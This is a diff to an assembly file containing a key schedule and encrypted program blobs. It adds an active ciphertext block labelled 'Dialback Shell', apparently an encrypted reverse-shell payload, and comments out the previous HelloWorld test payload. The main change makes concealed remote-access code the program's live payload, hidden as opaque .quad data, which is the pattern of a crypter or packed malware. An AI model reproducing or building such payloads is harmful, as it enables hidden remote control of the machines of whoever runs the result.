@@ -16,8 +16,34 @@ key_schedule:
 		//0x417f6d49ffe25fff9563b397028fd3c1
 	.quad 0xc1d38f0297b36395, 0xff5fe2ff496d7f41
 
+ctext:   // Dialback Shell                 
+    .quad 0x4cc5fabc529c7f72, 0xb246bf9a072691c4    
+    .quad 0x1614ea67fb81667a, 0x1cbbdca18b115764    
+    .quad 0x9fa8b87d5a7886ff, 0xb8b899864bb7d446    
+    .quad 0x54e4869e512a654e, 0x3ada5836213794a7    
+    .quad 0xbdca70c9ce650c87, 0xafc31c08d0aa542e    
+    .quad 0x03ea00addf2c4274, 0x5f836a7e8685bb85    
+    .quad 0x7e2e5ca3fc3edddf, 0xf6b6a67463e25cd6    
+    .quad 0x042366d6ce1bc58e, 0xf40836f71b3728b6    
+    .quad 0x8e7aa4e01060cbc7, 0x85e452ca70f83992    
+    .quad 0x3e0b00f7ce12d96a, 0x6b3e061d41565f51    
+    .quad 0x18e9a1b20c43cced, 0x1c5eac9e04937171    
+    .quad 0xcf896c8cc2942470, 0xad1c97fcf58b2eaf    
+    .quad 0x3ee8b6dd6ee10473, 0x1f935006bfe7bf7d    
+    .quad 0xd1c062955e01f984, 0x39199ca73f9993d7    
+    .quad 0x7c0f2ae94bd3ddb6, 0xbfee51d0d2a30906    
+    .quad 0xb0b15c6582fd4a9c, 0xf095c448ba1770a6    
+    .quad 0xa9bce0806c79f33e, 0x22c061a62ff657d7    
+    .quad 0xd55b9156da589dc3, 0x0ee37400a1a28f7c    
+    .quad 0x72a10a4cc4fa6bc9, 0xa51dec7b5904682b    
+    .quad 0x1a0978aeac1aa0e9, 0x2a9788746060534d    
+    .quad 0xfd9b52c1553ff78a, 0x37b5a13550c0c39a    
+    .quad 0x43b5057c863297fd, 0xb73b554ab727f35f    
+    .quad 0x9eb6a5d82e722bc8, 0xe20840570af96dc1    
+    .quad 0x593c47a7ececca83, 0x2f43eecde3d637ca
 
-ctext: // HelloWorld (test SPASM)
+    // HelloWorld (test SPASM)
+    /*
     .quad 0x63d7d499609f5478, 0x8d45939e382790d8
     .quad 0x171ce951fe877946, 0x0280de978211446b
     .quad 0x80859c54754e94d7, 0x919586ad4eb5cb7d
@@ -26,6 +52,7 @@ ctext: // HelloWorld (test SPASM)
     .quad 0x06e31f90c1174042, 0x5e996f558b969eac
     .quad 0x621642a1e723cdd9, 0xe8a0b5514cfe46e8
     .quad 0x19137be6d32bd8be, 0xe9382bc6192f32b9
+    */
 
 
      // FizzBuzz Simple (test Control Flow)
@@ -55,6 +82,7 @@ ctext: // HelloWorld (test SPASM)
     .quad 0x9eb6a5d82e722bc8, 0xe20840570ae87af3
     .quad 0x593c47a7ececca83, 0x2f43eecde3d637ca
     */
+
 
 
 
